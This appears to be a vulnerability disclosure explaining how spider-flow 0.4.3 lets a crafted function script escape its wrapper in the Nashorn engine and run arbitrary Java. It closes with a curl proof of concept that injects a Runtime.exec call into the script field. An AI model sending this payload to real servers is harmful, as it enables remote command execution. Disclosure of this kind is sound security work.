### spider-flow code injection causes rce

spider-flow code injection causes command execution project introduction spider-flow is a crawler platform that graphically defines the crawler process and implements a crawler without code project address https://github.com/ssssssss-team/spider-flow project versions 0.4.3 vulnerability analysis Found spider-flow-web using script engine Nashorn can parse javascript code and run it. Java objects can be invoked through js code. FunctionService.saveFunction() is executed at line 33 of src/main/java/org/spiderflow/controller/FunctionController.java

Author: Puppy

![image-20240102150007125](C:\Users\28395\AppData\Roaming\Typora\typora-user-images\image-20240102150007125.png)

The parameters passed are



![image-20240102150020267](C:\Users\28395\AppData\Roaming\Typora\typora-user-images\image-20240102150020267.png)

ScriptManager.validScript() is called in line 11 of src/main/java/org/spiderflow/core/service/FunctionService.java



![image-20240102150027961](C:\Users\28395\AppData\Roaming\Typora\typora-user-images\image-20240102150027961.png)

Before that, there was initialization. [@PostConstruct](http://twitter.com/PostConstruct) annotation initializes init(). Call ScriptManager.createEngine () to complete initialization of the function.



![image-20240102150033302](C:\Users\28395\AppData\Roaming\Typora\typora-user-images\image-20240102150033302.png)

The initialization process creates the Nashorn engine



![image-20240102150048430](C:\Users\28395\AppData\Roaming\Typora\typora-user-images\image-20240102150048430.png)

Then concatenate the previous function name scripts. This can be considered empty.

![image-20240102150056198](C:\Users\28395\AppData\Roaming\Typora\typora-user-images\image-20240102150056198.png)

Here we think of the first existence 
 The custom validScript function executed later here uses the Nashorn engine to execute the js code.

![image-20240102150106518](C:\Users\28395\AppData\Roaming\Typora\typora-user-images\image-20240102150106518.png)

Notice here that the code is encapsulated in a function. If successful, encapsulation requires a function call to invoke. You can escape directly from here.



### poc



```
curl http://127.0.0.1:8088/function/save -X POST -d "id=&name=a&parameter=&script=}Java.type(\"java.lang.Runtime\").getRuntime().exec(\"calc\");{"
```

![img](https://cdn-images-1.medium.com/max/750/1*NDwh_b5VZTtzBh8Fzu5btA.png)